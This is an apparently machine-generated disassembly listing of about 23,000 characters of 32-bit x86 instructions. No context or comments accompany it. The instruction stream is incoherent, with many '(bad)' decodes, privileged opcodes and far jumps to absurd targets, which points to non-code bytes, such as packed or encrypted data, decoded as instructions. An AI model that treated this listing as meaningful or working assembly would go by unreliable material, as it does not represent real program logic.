  4254b4:	cmp    eax,0xa7c3824f
  4254b9:	aam    0x47
  4254bb:	push   0xffffffb9
  4254bd:	iret   
  4254be:	jge    0x4254c8
  4254c0:	shl    ebp,0x45
  4254c3:	xchg   esi,eax
  4254c4:	jge    0x425472
  4254c6:	fistp  DWORD PTR [eax+0x5e505efe]
  4254cc:	mov    bh,0xf3
  4254ce:	or     al,0xd1
  4254d0:	xor    DWORD PTR [esi+0x7a7bdde8],esi
  4254d6:	shr    BYTE PTR [ebx+0x24],0x8
  4254da:	nop
  4254db:	repz ds icebp 
  4254de:	mov    al,0x37
  4254e0:	scas   eax,DWORD PTR es:[edi]
  4254e1:	imul   edx,DWORD PTR [ebp+0x73],0x501852c3
  4254e8:	inc    ebx
  4254e9:	xchg   esi,eax
  4254ea:	gs jno 0x42554d
  4254ed:	jne    0x4254c9
  4254ef:	shl    DWORD PTR [esi],0xca
  4254f2:	mov    WORD PTR [ebx+0x30],?
  4254f5:	outs   dx,DWORD PTR ds:[esi]
  4254f6:	in     al,0x26
  4254f8:	(bad)  
  4254f9:	cmp    eax,0xf41da8ee
  4254fe:	xchg   esi,eax
  4254ff:	dec    ebx
  425500:	repnz adc ecx,esp
  425503:	sahf   
  425504:	pop    ds
  425505:	call   0xf88ae36c
  42550a:	jmp    0xae7:0x6d7ab5fe
  425511:	clc    
  425512:	pop    ecx
  425513:	jge    0x4254e7
  425515:	js     0x4254ab
  425517:	js     0x4254cc
  425519:	mov    WORD PTR [edx],gs
  42551b:	mov    eax,0x771b4354
  425520:	mov    BYTE PTR [ecx-0x63ee89fd],al
  425526:	inc    ebx
  425527:	and    BYTE PTR [edi],dh
  425529:	push   0x1d
  42552b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42552c:	ret    
  42552d:	add    BYTE PTR [edx],cl
  42552f:	mov    al,ds:0x43ad02a4
  425534:	out    dx,eax
  425535:	fstp   TBYTE PTR [ebx]
  425537:	and    cl,BYTE PTR [edx+0x1c]
  42553a:	stc    
  42553b:	pushf  
  42553c:	mov    esp,0x1bd2f8ab
  425541:	(bad)
  425545:	test   al,0x8f
  425547:	frstor [ecx-0x6d]
  42554a:	mov    BYTE PTR [eax-0x40],ch
  42554d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42554e:	xor    eax,0x1f0b1246
  425553:	sbb    eax,0x43ab14a6
  425558:	mov    eax,0x13a055b3
  42555d:	repnz sti 
  42555f:	inc    ecx
  425560:	adc    BYTE PTR [eax],0x71
  425563:	inc    ecx
  425564:	pop    ss
  425565:	mov    ecx,0x5d6ca9e2
  42556a:	xchg   ebx,eax
  42556b:	sbb    DWORD PTR [edx+esi*1-0x5effa96b],edx
  425572:	mov    esi,DWORD PTR [edi+0x3a1571df]
  425578:	lods   eax,DWORD PTR ds:[esi]
  425579:	cmp    bh,BYTE PTR [edx+edx*2-0x13]
  42557d:	retf   
  42557e:	ret    
  42557f:	jns    0x4255fe
  425581:	sbb    BYTE PTR [eax],al
  425583:	out    0xed,eax
  425585:	test   dl,bh
  425587:	jecxz  0x4255d7
  425589:	(bad)  
  42558a:	mov    cl,0x13
  42558c:	fcmovu st,st(4)
  42558e:	into   
  42558f:	test   eax,0xde8dee07
  425594:	xchg   BYTE PTR [edi+ecx*4-0x49200663],bl
  42559b:	jns    0x4255a1
  42559d:	xor    cl,BYTE PTR [edi+0x31d24904]
  4255a3:	ins    WORD PTR es:[edi],dx
  4255a5:	test   BYTE PTR [ebx],ch
  4255a7:	cmp    eax,0x5325ca81
  4255ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255ad:	retf   
  4255ae:	push   edx
  4255af:	retf   0xa815
  4255b2:	add    ah,al
  4255b4:	jecxz  0x42554b
  4255b6:	loope  0x425587
  4255b8:	inc    ebx
  4255b9:	jo     0x4255b8
  4255bb:	mov    ds:0xb3da3,eax
  4255c0:	jnp    0x425558
  4255c2:	xor    eax,0xaadc0a50
  4255c7:	or     BYTE PTR [ebp-0x29],dh
  4255ca:	adc    eax,0xd06e0670
  4255cf:	ins    DWORD PTR es:[edi],dx
  4255d0:	shr    BYTE PTR [edx+edx*8-0x5e4dc7c2],cl
  4255d7:	cli    
  4255d8:	cwde   
  4255d9:	mov    edi,0x4e6b0e21
  4255de:	jbe    0x4255c2
  4255e0:	mov    ebx,0x54ad9a35
  4255e5:	pop    edx
  4255e6:	pcmpgtb mm1,mm4
  4255e9:	and    BYTE PTR [edx-0x5c],0x78
  4255ed:	test   al,0xaa
  4255ef:	xor    al,0xb5
  4255f1:	nop
  4255f2:	or     BYTE PTR [edx],dl
  4255f4:	(bad)  
  4255f5:	dec    edx
  4255f6:	jmp    0x42561a
  4255f8:	pop    ebx
  4255f9:	xchg   dl,ch
  4255fb:	push   esi
  4255fc:	sub    al,0xb9
  4255fe:	test   al,0x50
  425600:	stos   DWORD PTR es:[edi],eax
  425601:	cmp    ecx,eax
  425603:	popa   
  425604:	xor    edx,DWORD PTR [esi+0x7bc189e2]
  42560a:	push   ss
  42560b:	(bad)
  42560e:	daa    
  42560f:	iret   
  425610:	pop    esp
  425611:	pop    ebp
  425612:	ds pusha 
  425614:	sub    eax,DWORD PTR [edi+esi*4]
  425617:	fstp   TBYTE PTR [esi+0x731c1176]
  42561d:	push   cs
  42561e:	outs   dx,BYTE PTR ds:[esi]
  42561f:	das    
  425620:	jae    0x4255c1
  425622:	pop    ebp
  425623:	daa    
  425624:	and    DWORD PTR [edi+0x14],esi
  425627:	cmp    eax,0x6e4ee2d7
  42562c:	loopne 0x42561d
  42562e:	add    BYTE PTR [edx],al
  425630:	xor    ecx,DWORD PTR [ebx-0x4c4744c8]
  425636:	cmp    esi,DWORD PTR [ecx-0x55e288e8]
  42563c:	stc    
  42563d:	stos   BYTE PTR es:[edi],al
  42563e:	repz out dx,eax
  425640:	into   
  425641:	add    DWORD PTR [eax],eax
  425643:	out    0x1,eax
  425645:	add    BYTE PTR [eax],al
  425647:	push   esi
  425648:	fcmovnu st,st(7)
  42564a:	and    esp,edi
  42564c:	push   esp
  42564d:	sub    al,0xba
  42564f:	(bad)  
  425650:	(bad)  
  425651:	popa   
  425652:	add    al,0x78
  425654:	pop    edx
  425655:	aas    
  425656:	or     WORD PTR [edx-0x120da346],ax
  42565d:	ror    DWORD PTR [ebx],cl
  42565f:	mov    bl,0x12
  425661:	fld    st(4)
  425663:	call   0xa93b:0x5c2ea7d9
  42566a:	dec    esp
  42566b:	dec    edi
  42566c:	sub    DWORD PTR [edx+0x3fe52f7d],edi
  425672:	pop    edx
  425673:	std    
  425674:	add    DWORD PTR [edx],edx
  425676:	gs cdq 
  425678:	nop
  425679:	stos   DWORD PTR es:[edi],eax
  42567a:	mov    esi,0xecdd56d7
  42567f:	push   edx
  425680:	clc    
  425681:	shr    DWORD PTR ds:0xedc1cc72,1
  425687:	les    ebp,FWORD PTR [eax+0x668c2ae3]
  42568d:	dec    esi
  42568e:	imul   edi,DWORD PTR [ebp+0xf9dee99],0x4f19a124
  425698:	dec    edx
  425699:	dec    eax
  42569a:	add    edx,edx
  42569c:	daa    
  42569d:	ins    BYTE PTR es:[edi],dx
  42569e:	jl     0x425626
  4256a0:	shl    bl,cl
  4256a2:	aam    0xcf
  4256a4:	pop    ebp
  4256a5:	sbb    cl,BYTE PTR [eax]
  4256a7:	or     al,0x47
  4256a9:	sti    
  4256aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256ac:	or     DWORD PTR ds:0x8998ae8c,ebx
  4256b2:	adc    al,0x59
  4256b4:	addr16 adc bl,ah
  4256b7:	xor    DWORD PTR [edi+0x11],eax
  4256ba:	xor    cl,BYTE PTR [eax+0x26]
  4256bd:	xchg   ebx,eax
  4256be:	add    BYTE PTR [esi],0xe9
  4256c1:	mov    ds:0xb6bed8df,eax
  4256c6:	pusha  
  4256c7:	retf   
  4256c8:	mov    bl,0x2e
  4256ca:	jl     0x4256aa
  4256cc:	mov    ch,cl
  4256ce:	repnz outs dx,BYTE PTR ds:[esi]
  4256d0:	push   0xffffff8d
  4256d2:	test   al,0xfc
  4256d4:	inc    bl
  4256d6:	push   edi
  4256d7:	stos   BYTE PTR es:[edi],al
  4256d8:	push   0xffffffee
  4256da:	xor    dh,BYTE PTR [ebp-0x78816211]
  4256e0:	jne    0x425746
  4256e2:	pop    edi
  4256e3:	out    0x1b,eax
  4256e5:	mov    esp,0x5b08edca
  4256ea:	cdq    
  4256eb:	scas   eax,DWORD PTR es:[edi]
  4256ec:	out    dx,al
  4256ed:	add    DWORD PTR es:[edi-0x45],ebp
  4256f1:	std    
  4256f2:	(bad)  
  4256f4:	sub    DWORD PTR [esi-0x4d],edx
  4256f7:	fsubr  QWORD PTR [edx-0x3d9fb74a]
  4256fd:	in     eax,dx
  4256fe:	mov    ebx,0xbfe3fbbd
  425703:	xchg   esp,eax
  425704:	inc    edx
  425705:	cwde   
  425706:	pop    esp
  425707:	pop    edx
  425708:	lahf   
  425709:	pop    eax
  42570a:	add    edi,ebp
  42570c:	std    
  42570d:	cmc    
  42570e:	sub    eax,0xb4798771
  425713:	push   cs
  425714:	and    al,0xc5
  425716:	lods   eax,DWORD PTR ds:[esi]
  425717:	arpl   WORD PTR [esi+0x234992b2],sp
  42571d:	mov    cl,0xe3
  42571f:	adc    al,0x9
  425721:	inc    edi
  425722:	cmp    esi,DWORD PTR [edx+0x3e]
  425725:	stos   DWORD PTR es:[edi],eax
  425726:	(bad)  
  425727:	fadd   DWORD PTR [ecx-0xc]
  42572a:	xchg   ebx,eax
  42572b:	jmp    DWORD PTR [ecx-0x77]
  42572e:	mov    ebx,0x80daf78d
  425733:	add    bl,BYTE PTR [ebp+0x22]
  425736:	mov    dl,bh
  425738:	clc    
  425739:	in     al,0xc2
  42573b:	xor    al,0xd7
  42573d:	call   0x2675:0xef45c025
  425744:	cmc    
  425745:	ins    DWORD PTR es:[edi],dx
  425746:	sahf   
  425747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425748:	mov    bh,BYTE PTR [ebx]
  42574a:	xchg   BYTE PTR [eax+0x68],dl
  42574d:	out    dx,al
  42574e:	les    esi,FWORD PTR [ecx]
  425750:	fnstcw WORD PTR [ecx+0x5d]
  425753:	mov    WORD PTR [edx-0x52f2b5cc],ss
  425759:	mov    ds:0x98c30698,eax
  42575e:	xchg   ecx,eax
  42575f:	xchg   DWORD PTR [esi+0x28876484],ebp
  425765:	test   BYTE PTR [edx-0x4d],0x2e
  425769:	mov    dl,0x66
  42576b:	or     ch,bh
  42576d:	mov    al,ds:0xdab57576
  425772:	pop    es
  425773:	push   ecx
  425774:	xchg   ebp,eax
  425775:	push   ecx
  425776:	jmp    0x3c78bdc4
  42577b:	sub    al,0x14
  42577d:	and    esi,DWORD PTR [ebx]
  42577f:	stos   DWORD PTR es:[edi],eax
  425780:	mov    eax,0x9a3e58f6
  425785:	dec    eax
  425786:	jbe    0x4257b8
  425788:	pop    es
  425789:	ins    BYTE PTR es:[edi],dx
  42578a:	les    ebp,FWORD PTR [ebx+0x4c]
  42578d:	test   eax,0x2e43ed7f
  425792:	fucomi st,st(4)
  425794:	fst    DWORD PTR [ecx]
  425796:	lock inc ecx
  425798:	imul   edx,DWORD PTR [ecx-0xd],0x96d26fec
  42579f:	pop    ebp
  4257a0:	xor    DWORD PTR [esi-0x65447730],ebx
  4257a6:	in     eax,0xb1
  4257a8:	pop    eax
  4257a9:	add    al,0x9f
  4257ab:	pop    ebx
  4257ac:	pusha  
  4257ad:	jne    0x425762
  4257af:	scas   eax,DWORD PTR es:[edi]
  4257b0:	sbb    ecx,edi
  4257b2:	xlat   BYTE PTR ds:[ebx]
  4257b3:	dec    edx
  4257b4:	add    ebp,DWORD PTR [esi+0x724ef23e]
  4257ba:	push   0xffffff9a
  4257bc:	inc    esi
  4257bd:	and    edi,DWORD PTR [ecx]
  4257bf:	int3   
  4257c0:	ret    0x7d1b
  4257c3:	mov    al,0x5d
  4257c5:	lods   al,BYTE PTR ds:[esi]
  4257c6:	popa   
  4257c7:	pop    esi
  4257c8:	mov    ecx,DWORD PTR ds:0x7f8c3aae
  4257ce:	xor    BYTE PTR [ebx],bh
  4257d0:	je     0x425785
  4257d2:	push   ds
  4257d3:	sub    al,0xea
  4257d5:	daa    
  4257d6:	clc    
  4257d7:	mov    ch,0xd5
  4257d9:	addr16 pop edi
  4257db:	sub    ch,dl
  4257dd:	jge    0x4257d3
  4257df:	cli    
  4257e0:	add    eax,0x973b9f52
  4257e5:	push   esi
  4257e6:	fdiv   st,st(0)
  4257e8:	ret    0x9065
  4257eb:	or     al,0xa5
  4257ed:	dec    ebx
  4257ee:	sti    
  4257ef:	xor    DWORD PTR [edi+0x7f61ea5e],ebx
  4257f5:	clc    
  4257f6:	add    dl,BYTE PTR [ecx+eiz*8-0x65516c6b]
  4257fd:	lea    edx,[ebp-0x4f]
  425800:	popa   
  425801:	xor    eax,0x9c71eaee
  425806:	call   0xb672:0x6dce2ba4
  42580d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42580e:	push   ds
  42580f:	pop    edi
  425810:	pusha  
  425811:	fcmovnb st,st(1)
  425813:	jno    0x425808
  425815:	aad    0x36
  425817:	sbb    cl,al
  425819:	xor    edx,DWORD PTR [edi+ecx*4-0x7394b291]
  425820:	pop    es
  425821:	sub    BYTE PTR [ebp+0x123b60fb],cl
  425827:	in     eax,dx
  425828:	dec    ebx
  425829:	pusha  
  42582a:	dec    edx
  42582b:	pop    esp
  42582c:	cmp    al,0x46
  42582e:	add    dl,bh
  425830:	dec    esp
  425831:	push   es
  425832:	ret    
  425833:	mov    dh,0xcb
  425835:	(bad)  
  425836:	jge    0x425885
  425838:	shr    BYTE PTR [eax],1
  42583a:	test   eax,0xfce45f4a
  42583f:	(bad)  
  425840:	rol    BYTE PTR [ecx],1
  425842:	add    bh,ah
  425844:	add    DWORD PTR [eax],eax
  425846:	add    BYTE PTR [ebx+0x28],ah
  425849:	adc    edi,DWORD PTR [ecx]
  42584b:	mov    ebx,0xdfd2095b
  425850:	call   0x9d864aa
  425855:	sbb    DWORD PTR [eax],ecx
  425857:	add    dh,ch
  425859:	mov    eax,ds:0xbcbdeb15
  42585e:	add    BYTE PTR [edx],cl
  425860:	xor    BYTE PTR [ebp+ebp*1-0x53eb2a52],ch
  425867:	jg     0x4258e1
  425869:	dec    edi
  42586a:	mov    al,ds:0x13ae68ad
  42586f:	jp     0x4258c2
  425871:	out    dx,al
  425872:	(bad)  
  425873:	sbb    dl,bh
  425875:	call   0x194f23e4
  42587a:	retf   0xefa
  42587d:	and    dl,BYTE PTR [ecx]
  42587f:	mov    gs,WORD PTR [eax-0x422d1855]
  425885:	push   0xffffff9f
  425887:	cmp    DWORD PTR [ebp-0x6af9a33b],ebx
  42588d:	fistp  WORD PTR [esi-0x30]
  425890:	add    BYTE PTR [ecx+0x14e6423b],cl
  425896:	bndldx (bad),[edx]
  425899:	lahf   
  42589a:	pop    esp
  42589b:	rcr    DWORD PTR [esi+0x1],0x41
  42589f:	hlt    
  4258a0:	jmp    DWORD PTR [edx+0x6bc76a2a]
  4258a6:	add    BYTE PTR [ecx+0xedc9378],bl
  4258ac:	cs cli 
  4258ae:	mov    ds:0x504c221a,eax
  4258b3:	push   esi
  4258b4:	ret    
  4258b5:	fdiv   DWORD PTR [ebx]
  4258b7:	aam    0x57
  4258b9:	push   cs
  4258ba:	sbb    ebp,DWORD PTR [edx-0x66]
  4258bd:	imul   esi,DWORD PTR [eax+0x57c30c7d],0x1d190b1b
  4258c7:	mov    edi,0x9152992d
  4258cc:	ds sbb eax,0x63177b8f
  4258d2:	jg     0x42588a
  4258d4:	cmp    dh,cl
  4258d6:	mov    cl,0x3a
  4258d8:	push   esp
  4258d9:	pop    eax
  4258da:	add    al,0xf4
  4258dc:	xor    DWORD PTR [edx],ecx
  4258de:	sbb    BYTE PTR [ebx+edi*4],cl
  4258e1:	sar    DWORD PTR cs:[edx+0x3a],0x8e
  4258e6:	popa   
  4258e7:	ret    0xf2db
  4258ea:	and    ah,BYTE PTR gs:[eax+0x2e7841b3]
  4258f1:	sub    al,0xd2
  4258f3:	fcomip st,st(3)
  4258f5:	add    BYTE PTR [edi+0x6],al
  4258f8:	pop    eax
  4258f9:	jnp    0x4258fa
  4258fb:	ds jnp 0x4258eb
  4258fe:	ret    0x4be2
  425901:	pusha  
  425902:	mov    eax,0x46259b0d
  425907:	dec    ecx
  425908:	xchg   edx,eax
  425909:	and    edx,0x53
  42590c:	repz call FWORD PTR [ecx+eiz*8-0x4b]
  425911:	out    0xe8,eax
  425913:	push   ebx
  425914:	dec    ecx
  425915:	popf   
  425916:	cmp    ebp,esp
  425918:	mov    esp,0x2676fed5
  42591d:	push   eax
  42591e:	pusha  
  42591f:	repnz mov DWORD PTR [esi-0x3d],edx
  425923:	nop
  425924:	inc    ebp
  425925:	out    dx,al
  425926:	mov    bl,0xd1
  425928:	push   esp
  425929:	pop    edi
  42592a:	jne    0x425910
  42592c:	ins    DWORD PTR es:[edi],dx
  42592d:	xchg   ecx,eax
  42592e:	repz dec edx
  425930:	xor    al,BYTE PTR [ebx+0x67]
  425933:	and    eax,0x435aa009
  425938:	xchg   ebp,eax
  425939:	cmp    DWORD PTR [edi-0x6e67590c],esi
  42593f:	(bad)  
  425940:	jmp    0xb044aca3
  425945:	aad    0x74
  425947:	push   0xfffffffe
  425949:	mov    ebp,0xcc292ed9
  42594e:	pop    edi
  42594f:	out    dx,eax
  425950:	div    DWORD PTR [edi+ecx*8]
  425953:	lock ss in al,0xfd
  425957:	xchg   ebp,eax
  425958:	pop    edx
  425959:	into   
  42595a:	dec    ecx
  42595b:	push   ebx
  42595c:	dec    eax
  42595d:	sti    
  42595e:	shl    bl,cl
  425960:	or     DWORD PTR [edx+0x26],esi
  425963:	mov    ds:0x3593c72b,al
  425968:	or     eax,0xe90da320
  42596d:	sub    BYTE PTR [edi],0x6c
  425970:	and    al,0x0
  425972:	mov    ?,WORD PTR [edi]
  425974:	mov    edx,0xae53eb4a
  425979:	mov    WORD PTR es:[ebx+edx*1],ss
  42597d:	in     eax,0xcb
  42597f:	clc    
  425980:	add    DWORD PTR [edi],ebx
  425982:	cwde   
  425983:	xchg   esp,eax
  425984:	jne    0x425924
  425986:	cmc    
  425987:	leave  
  425988:	jo     0x42599d
  42598a:	test   DWORD PTR ds:0xd2dccf0d,ecx
  425990:	sbb    eax,0xa3d44318
  425995:	ss aad 0xf1
  425998:	enter  0x1807,0xde
  42599c:	sbb    DWORD PTR [ecx+0x30],eax
  42599f:	mov    dh,0x6f
  4259a1:	jnp    0x4259de
  4259a3:	or     eax,0x4e477ba6
  4259a8:	outs   dx,BYTE PTR gs:[esi]
  4259aa:	cpuid  
  4259ac:	lds    edi,FWORD PTR [edx-0x4a]
  4259af:	dec    edi
  4259b0:	(bad)  
  4259b1:	cli    
  4259b2:	ror    dh,cl
  4259b4:	mov    ds:0x31ea6746,al
  4259b9:	cmc    
  4259ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259bb:	ins    BYTE PTR es:[edi],dx
  4259bc:	ficomp DWORD PTR [ebx+0x29]
  4259bf:	jmp    0x4259bd
  4259c1:	mov    esp,edi
  4259c3:	sbb    bh,BYTE PTR [ebx]
  4259c5:	test   ebx,esp
  4259c7:	stos   BYTE PTR es:[edi],al
  4259c8:	push   esi
  4259c9:	mov    al,0x62
  4259cb:	outs   dx,BYTE PTR ds:[esi]
  4259cc:	mov    ch,0xe1
  4259ce:	ja     0x4259d8
  4259d0:	pop    esi
  4259d1:	jns    0x42598f
  4259d3:	and    eax,0x93d5f619
  4259d8:	xchg   DWORD PTR [edi-0x68],edi
  4259db:	stc    
  4259dc:	aam    0xb2
  4259de:	lock aam 0xe5
  4259e1:	sub    ah,BYTE PTR [ebx-0x21]
  4259e4:	scas   eax,DWORD PTR es:[edi]
  4259e5:	ret    
  4259e6:	sahf   
  4259e7:	lahf   
  4259e8:	xor    eax,0xadef5a12
  4259ed:	bound  edi,QWORD PTR [ecx]
  4259ef:	sar    BYTE PTR [ebx],1
  4259f1:	jno    0x425a1b
  4259f3:	mov    eax,ds:0x15207875
  4259f8:	pusha  
  4259f9:	pusha  
  4259fa:	outs   dx,BYTE PTR ds:[esi]
  4259fb:	adc    eax,edi
  4259fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259fe:	dec    eax
  4259ff:	mov    edi,0x467e8808
  425a04:	test   al,0xc4
  425a06:	push   esp
  425a07:	fwait
  425a08:	mov    esp,0xeeed7f60
  425a0d:	cmc    
  425a0e:	test   DWORD PTR [ebp-0x44],ebx
  425a11:	loopne 0x4259b7
  425a13:	dec    esp
  425a14:	or     BYTE PTR ds:0xe4752df7,dl
  425a1a:	push   cs
  425a1b:	sbb    ebp,DWORD PTR [eax]
  425a1d:	jmp    0x6a96:0xb4298c89
  425a24:	and    eax,0xf4cf9af6
  425a29:	inc    eax
  425a2a:	mov    edi,0x5f0484
  425a2f:	sbb    al,0x66
  425a31:	in     eax,0x66
  425a33:	jmp    edi
  425a35:	lahf   
  425a36:	jle    0x425a43
  425a38:	dec    edx
  425a39:	sub    BYTE PTR [esi],bh
  425a3b:	test   DWORD PTR [ecx-0x54],ecx
  425a3e:	adc    edi,DWORD PTR [ebp-0x18fffe2e]
  425a44:	add    DWORD PTR [eax],eax
  425a46:	add    BYTE PTR [esi+0x9],cl
  425a49:	jmp    0x4a4c:0xf8cb9815
  425a50:	aaa    
  425a51:	out    dx,al
  425a52:	fcomi  st,st(2)
  425a54:	aas    
  425a55:	push   0x4
  425a57:	pop    ds
  425a58:	push   ebx
  425a59:	sub    BYTE PTR [ebp+0x47],ah
  425a5c:	clc    
  425a5d:	cmp    ah,ch
  425a5f:	shl    BYTE PTR [ebp+0x33b73627],1
  425a65:	or     edx,DWORD PTR [ecx-0x5327a1c8]
  425a6b:	sub    al,cl
  425a6d:	test   eax,0x943a9fc9
  425a72:	xor    bh,al
  425a74:	add    ebp,DWORD PTR ss:[ebp-0x4e]
  425a78:	and    eax,0xd30a714f
  425a7d:	mov    ch,0xf0
  425a7f:	idiv   esi
  425a81:	cld    
  425a82:	pop    ss
  425a83:	rol    DWORD PTR [edi+edi*1+0x52],cl
  425a87:	xor    al,0x70
  425a89:	pop    edi
  425a8a:	dec    edi
  425a8b:	add    ebx,DWORD PTR [ebx-0x7bc31924]
  425a91:	jge    0x425aa3
  425a93:	lock mov cs,WORD PTR [ebx]
  425a96:	vandpd xmm3,xmm3,XMMWORD PTR [edi]
  425a9a:	dec    ebx
  425a9b:	mov    ds:0x1b147f48,al
  425aa0:	jno    0x425aef
  425aa2:	add    BYTE PTR [edi+0x2291b04],bl
  425aa8:	mov    eax,0xfc02b43e
  425aad:	and    DWORD PTR ds:0x3c4067d4,ebp
  425ab3:	dec    ebx
  425ab4:	xchg   edx,eax
  425ab5:	iret   
  425ab6:	test   al,0xc6
  425ab8:	iret   
  425ab9:	(bad)  
  425aba:	adc    al,0xe5
  425abc:	sub    al,0xf4
  425abe:	repz and BYTE PTR [eax+0x4be36760],0xb8
  425ac6:	bound  ecx,QWORD PTR [esi-0x7665c617]
  425acc:	add    BYTE PTR [esp+ebx*2-0x69],al
  425ad0:	add    cl,BYTE PTR [edi-0x21033a77]
  425ad6:	mov    ah,0x55
  425ad8:	(bad)  
  425ad9:	in     eax,dx
  425ada:	mov    BYTE PTR [ecx-0x5fc18816],ch
  425ae0:	pop    ss
  425ae1:	out    dx,eax
  425ae2:	xchg   ecx,eax
  425ae3:	inc    ebp
  425ae4:	add    al,0xfc
  425ae6:	data16 ss jl 0x425afe
  425aea:	div    ebx
  425aec:	mov    al,0xf6
  425aee:	ret    0xabc
  425af1:	mov    gs,ecx
  425af3:	adc    ah,BYTE PTR [ebx]
  425af5:	retf   
  425af6:	test   eax,0x1160fbb
  425afb:	jae    0x425b00
  425afd:	outs   dx,BYTE PTR ds:[esi]
  425afe:	pop    esi
  425aff:	fcomp  DWORD PTR [ecx-0x3e9f03ca]
  425b05:	or     DWORD PTR ds:0xdb6fb301,edi
  425b0b:	loope  0x425ae5
  425b0d:	div    bh
  425b0f:	and    cl,dh
  425b11:	push   eax
  425b12:	shl    BYTE PTR [edi-0x462dfccd],0x84
  425b19:	sbb    eax,0x9fa3e292
  425b1e:	jp     0x425b38
  425b20:	stc    
  425b21:	sub    BYTE PTR ds:0xb9e70022,ah
  425b27:	iret   
  425b28:	adc    ah,ah
  425b2a:	cmp    esi,0xffffff9e
  425b2d:	ds xchg edx,eax
  425b2f:	pushf  
  425b30:	lahf   
  425b31:	fist   DWORD PTR [edi]
  425b33:	push   ebx
  425b34:	jns    0x425b09
  425b36:	inc    eax
  425b37:	call   FWORD PTR [ebp-0x7e]
  425b3a:	pop    esi
  425b3b:	add    edx,DWORD PTR [esi+0xd]
  425b3e:	push   es
  425b3f:	cmp    BYTE PTR [ecx+0x74],0xcd
  425b43:	xlat   BYTE PTR ds:[ebx]
  425b44:	rol    DWORD PTR [esi+0x30808071],0xbe
  425b4b:	popf   
  425b4c:	hlt    
  425b4d:	jae    0x425b95
  425b4f:	cmp    eax,0x65b331f0
  425b54:	jbe    0x425aff
  425b56:	adc    eax,0xf8de2283
  425b5b:	push   ebx
  425b5c:	scas   eax,DWORD PTR es:[edi]
  425b5d:	in     al,0x55
  425b5f:	call   0x3940c58b
  425b64:	mov    esp,0xfc17455d
  425b69:	and    DWORD PTR [esi+0x7a],esi
  425b6c:	jmp    0xd1dd:0x294fac4a
  425b73:	xor    BYTE PTR ds:0x4a9af3ae,dl
  425b79:	push   ss
  425b7a:	ror    ecx,1
  425b7c:	adc    DWORD PTR [edi+0xf],ecx
  425b7f:	aas    
  425b80:	and    DWORD PTR [ebp+0x49181736],ecx
  425b86:	sub    DWORD PTR [ebx+ebp*2],edx
  425b89:	in     al,dx
  425b8a:	push   0x6f3958ec
  425b8f:	sub    al,0x1c
  425b91:	outs   dx,BYTE PTR ds:[esi]
  425b92:	sbb    ebx,ebp
  425b94:	shr    DWORD PTR [eax+esi*4],1
  425b97:	pop    ss
  425b98:	xor    BYTE PTR [edi+0x77],0x38
  425b9c:	cmp    edx,ebx
  425b9e:	jno    0x425bb4
  425ba0:	cmp    BYTE PTR [eax+edx*1+0x4cfed809],dl
  425ba7:	sub    al,0xf6
  425ba9:	mov    bl,0xfd
  425bab:	sub    BYTE PTR [ecx-0x5b],dl
  425bae:	pop    edi
  425baf:	lds    ecx,FWORD PTR [ebx]
  425bb1:	(bad)  
  425bb2:	sar    bl,cl
  425bb4:	popf   
  425bb5:	(bad)  
  425bb8:	popa   
  425bb9:	jge    0x425c2f
  425bbb:	sbb    dh,BYTE PTR [edi]
  425bbd:	cmp    ebx,DWORD PTR [ecx-0x79]
  425bc0:	pop    edx
  425bc1:	cmp    bl,BYTE PTR [edx+ebx*4+0x63]
  425bc5:	(bad)  
  425bc6:	(bad)  
  425bc7:	popf   
  425bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425bc9:	cmp    ebx,ebx
  425bcb:	push   edx
  425bcc:	adc    dl,BYTE PTR [ebp+eiz*1+0x206db96f]
  425bd3:	mov    al,0x9c
  425bd5:	inc    ebx
  425bd6:	loope  0x425bb9
  425bd8:	pop    ss
  425bd9:	shl    DWORD PTR es:[ecx+ecx*4+0x35],cl
  425bde:	(bad)  
  425bdf:	xor    BYTE PTR [esi-0x1ce4cbfd],bh
  425be5:	aas    
  425be6:	inc    eax
  425be7:	rcl    BYTE PTR ds:0x3be739c8,cl
  425bed:	inc    ebp
  425bee:	sbb    bh,BYTE PTR [ebx]
  425bf0:	enter  0x9f2a,0x38
  425bf4:	mov    cl,0x78
  425bf6:	and    eax,0x437b5bf0
  425bfb:	stc    
  425bfc:	enter  0xe07b,0xc6
  425c00:	jae    0x425be8
  425c02:	mov    ebp,0x7f96bc48
  425c07:	jle    0x425c31
  425c09:	in     eax,dx
  425c0a:	mov    bh,0x66
  425c0c:	test   DWORD PTR [ecx+ecx*2-0x3ab7750f],edx
  425c13:	xchg   edi,eax
  425c14:	pop    edx
  425c15:	sbb    al,0xe4
  425c17:	rcl    DWORD PTR [edi+0x1196e1e2],1
  425c1d:	fistp  DWORD PTR [edi]
  425c1f:	fstp   st(6)
  425c21:	fild   QWORD PTR [edi-0x77e503d8]
  425c27:	xchg   esp,eax
  425c28:	arpl   WORD PTR ds:[edx-0x5a],dx
  425c2c:	add    eax,0xfa4900a3
  425c31:	mov    ebx,0xfd4fbb4e
  425c36:	inc    DWORD PTR [edx+0x927c159]
  425c3c:	adc    al,0x82
  425c3e:	retf   0xd4a4
  425c41:	add    DWORD PTR [eax],eax
  425c43:	out    0x1,eax
  425c45:	add    BYTE PTR [eax],al
  425c47:	arpl   WORD PTR [ecx],ax
  425c49:	pop    edi
  425c4a:	repnz sbb eax,DWORD PTR [edx-0x7c06babf]
  425c51:	push   0x5b
  425c53:	xchg   esi,eax
  425c54:	dec    eax
  425c55:	sub    DWORD PTR [ecx-0x35c12a42],edi
  425c5b:	or     BYTE PTR [ebx],bl
  425c5d:	mov    eax,0x84be347
  425c62:	in     al,0x47
  425c64:	xchg   esi,eax
  425c65:	jmp    0x2269ed91
  425c6a:	test   BYTE PTR [edx],0xef
  425c6d:	fwait
  425c6e:	inc    ebp
  425c6f:	pop    ecx
  425c70:	cwde   
  425c71:	jb     0x425cd6
  425c73:	cmp    esp,esi
  425c75:	pop    ecx
  425c76:	inc    esi
  425c77:	add    edx,DWORD PTR [edi+0x68]
  425c7a:	retf   0xb3fa
